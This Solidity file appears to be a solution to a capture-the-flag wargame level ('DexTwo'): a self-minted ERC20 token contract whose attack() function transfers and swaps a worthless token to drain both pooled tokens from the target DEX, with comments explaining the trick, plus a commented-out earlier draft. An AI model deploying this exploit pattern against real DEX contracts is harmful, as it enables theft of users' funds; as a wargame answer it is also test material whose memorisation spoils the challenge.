// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./23-dextwo.sol";
// import "/home/oem/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract Attack23 is ERC20 {
    DexTwo public target;
    address public token1;
    address public token2;

    constructor(
        address _target,
        string memory _name,
        string memory _symbol,
        uint256 _initialSupply
    ) public ERC20(_name, _symbol) {
        _mint(address(this), _initialSupply); 
        // we only need to mint 4 token, (could be hardcoded instead of _initialSupply)

        target = DexTwo(_target);
        token1 = target.token1();
        token2 = target.token2();
    }

    function attack() public {
        ERC20(address(this)).approve(address(target), 3); // approve 3 token, the dex will use transferFrom twice, once with 1 and then with 2
        ERC20(address(this)).transfer(address(target), 1); // now the dex balanceOf is 1
        target.swap(address(this), token1, 1); // get 100 of token1 new balanceOf new token is 2
        target.swap(address(this), token2, 2); // get 100 of token2
    }
}



// contract Attack23 {
//     DexTwo public target;
//     address public owner;
//     address public token3;
//     uint256 public pool;
    

//     constructor(address _target, uint256 _amount) {
//         owner = msg.sender;
//         target = DexTwo(_target);
//         pool = _amount;      
//     }


//     function attack(address _from1, address _from2, uint256 _amount) public {
//         target.swap(_from1, token3, _amount);
//         target.swap(_from2, token3, _amount);
//     }

//     receive() external payable {}

//      modifier onlyOwner() {
//          require (msg.sender == owner, "Only the owner can withdraw");
//          _;
//      }

//      function withdraw() onlyOwner public {
//           msg.sender.transfer(address(this).balance);
//       }
// }
